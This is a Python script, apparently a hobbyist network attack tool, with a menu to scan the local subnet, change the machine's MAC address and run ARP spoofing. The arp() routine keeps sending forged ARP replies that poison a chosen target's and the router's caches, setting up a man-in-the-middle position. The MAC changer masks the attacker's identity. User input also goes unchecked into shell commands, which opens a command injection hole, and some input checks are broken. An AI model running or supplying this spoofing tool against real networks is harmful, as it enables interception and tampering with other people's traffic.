#!/usr/bin/env python3
import subprocess
import time
import re
import scapy.all as s
import socket
def restore(t,r,dt,dr):
    a=s.ARP(op=2,pdst=t,hwdst=dt,psrc=r,hwsrc=dr)
    b=s.ARP(op=2,pdst=r,hwdst=dr,psrc=t,hwsrc=dt)
    s.send(a,verbose=False)
    s.send(b,verbose=False)
    return()
#########################################################################
def arp():
    d=scan()
    print("|Ip Address\tMac Address\t|")
    print("_"*45)
    for i,j in d.items():
        print(i,"\t",j)
    t=input("Enter the target:- ")
    r=router()
    i=0
    try:
        while(True):
            a=s.ARP(op=2,psrc=r,pdst=t,hwdst=d[t]) #to fool the target
            b=s.ARP(op=2,psrc=t,pdst=r,hwdst=d[r]) #to fool the router
            s.send(a,verbose=False)
            s.send(b,verbose=False)
            i+=2
            print("\r[+] packet sent:- "+str(i),end=" ")

    except KeyboardInterrupt:
        subprocess.run("clear")
        print("restoring....")
        time.sleep(1)
        restore(t,r,d[t],d[r])
        print("Entering Main Menu.........")
        time.sleep(1)
        return()

##################################################################################3
def router():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))                         #to get ip
    r=s.getsockname()[0].split(".")
    f=""
    for i in range(len(r)-1):
        f+=r[i]
        f+="."
    f+="1"
    return(f)

def ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    #s.gethostbyname()
    #print(s.getsockname())
    #input()               #to get ip
    return(str(s.getsockname()[0])) #return ip
#############################################################################
def scan():
    _=ip().split(".")
    a=""
    for i in range(len(_)-1):
        a+=_[i]
        a+="."
    a+="1/24"
    c=0
    d={}
    arp_request=s.ARP(pdst=a) #to create a request
    arp_broadcast=s.Ether(dst="ff:ff:ff:ff:ff:ff") #to set the returm place
    #dst can be any mac
    arp_complete=arp_broadcast/arp_request #to combine request and broadcast
    answered=s.srp(arp_complete,timeout=3,verbose=False)[0] #to broadcasst or send the packets,answered means ip valid
    #print("***")
    time.sleep(2)
    subprocess.run("clear")
    for i in answered:
        d[i[1].psrc]=i[1].hwsrc
    return(d)
################################################################################


def mac(a):
    try:
        c=subprocess.check_output("ifconfig {}".format(a),shell=True).decode('UTF-8')
        l=re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",c)
        return(l.group(0))
    except:
        return (1)


#######################################################################################
def mac_changer():
    ch="y"
    while(ch=="y" or ch=="yes"):
        subprocess.run("clear")
        print("interfaces\n********")
        print(*s.get_if_list(),sep="\n")
        print("********")
        while(True):
            a=input("interface >")
            if len(a)<0:
                print("enter the interface")
            else:
                break
        while(True):
            b=input("new mac address > ")
            if int(b.split(":")[0])%2==0 and len(b)>0:
                break
            else:
                print("first block of mac must be only even")
        subprocess.run("clear")
        print("+Changing Mac Address to {}".format(b))
        subprocess.call("sudo ifconfig {} down".format(a),shell=True)
        subprocess.call("sudo ifconfig  {} hw ether {}".format(a,b),shell=True)
        subprocess.call("sudo ifconfig {} up ".format(a),shell=True)
        c=mac(a)
        if c==b:
            print("+mac changed from {}to{}".format(c,b))
            time.sleep(2)
            break
        else:
            print("mac adress not changed")
            ch=input("Do You Want to Try Again?[y/yes]").lower()
    print("Entering to Main Menu.......")
    time.sleep(2)
#############################################################################
# main part

while(True):
    subprocess.run("clear")
    print("\t||ENTER YOUR CHOICE NUMBER||\n******************************************************\n1)current mac\n2)mac changer\n3)Device Connected In Network\n4)Ip of My Computer\n5)arp spoofing\n6)exit")
    c= (input("choice > "))
    if c=="1":
        subprocess.run("clear")
        print("interfaces\n********")
        print(*s.get_if_list(),sep="\n")
        print("********")
        a=input("Interface > ").strip()
        print(mac(a))
        input("press enter to continue")
        print("Entering to Main Menu.......")
        time.sleep(2)

    elif c=="2":
        subprocess.run("clear")
        mac_changer()
        subprocess.run("clear")
    elif c=="3":
        subprocess.run("clear")
        d=scan()
        print("|Ip Address\tMac Address\t|")
        print("_"*45)
        for i,j in d.items():
            print(i,"\t",j)
        input("Press Enter To continue")
        print("Entering Main Menu......")
        time.sleep(0)
        subprocess.run("clear")

    elif c=="4":
        subprocess.run("clear")
        print(ip())
        print("Entering to Main Menu.......")
        time.sleep(3)
    elif c=="5":
        arp()
    else:
        subprocess.run("clear")
        print("\t\tThank You :)")
        time.sleep(2)
        subprocess.run("clear")
        quit()
